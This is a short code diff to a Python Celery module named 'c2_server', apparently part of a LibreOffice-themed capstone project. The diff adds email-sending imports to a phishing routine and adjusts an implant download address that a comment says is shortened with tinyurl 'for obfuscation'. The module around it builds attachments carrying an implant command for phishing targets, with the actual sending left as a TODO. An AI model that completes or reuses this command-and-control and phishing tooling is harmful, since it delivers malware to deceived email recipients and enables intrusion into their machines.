@@ -1,5 +1,11 @@
 from celery import Celery
 import socket
+import smtplib
+from os.path import basename
+from email.mime.application import MIMEApplication
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.utils import COMMASPACE, formatdate
 
 app = Celery('c2_server', broker='redis://redis:6379/0', backend='redis://redis:6379/0')
 
@@ -7,7 +13,7 @@ original_implant_addr = "https://github.com/d1lacy/LibreOfficeCapstone/raw/refs/
 
 
 # shortened for obfuscation
-IMPLANT_ADDR = "https://tinyurl.com/ycxssc7p"\
+IMPLANT_ADDR = "https://tinyurl.com/ycxssc7p"
 
 PORT = 9999
 
@@ -60,3 +66,4 @@ def send_phishing_email(target, fingerprint):
     attachment_path = generate_attachment(implant_command, fingerprint)
 
     # TODO: send email with attachment
+    
